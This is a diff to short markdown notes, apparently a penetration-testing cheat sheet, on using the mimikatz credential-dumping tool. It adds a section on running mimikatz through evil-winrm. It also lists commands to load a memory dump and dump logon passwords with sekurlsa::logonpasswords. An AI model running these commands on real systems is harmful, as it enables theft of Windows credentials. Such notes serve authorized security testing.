@@ -4,17 +4,22 @@ https://github.com/gentilkiwi/mimikatz
 Download:
 https://github.com/gentilkiwi/mimikatz/releases
 
-# Commands/output > output file
+### Commands/output > output file
 ```
 log file.log
 ```
 
-# Read from a memory dump 
+### Running mimikatz via evil-winrm
+```
+.\mimikatz.exe "{command}" exit
+```
+
+### Read from a memory dump 
 ```
 sekurlsa::minidump {filename .dump}
 ```
 
-# Get logon passwords 
+### Get logon passwords 
 ```
 sekurlsa::logonpasswords
 ```
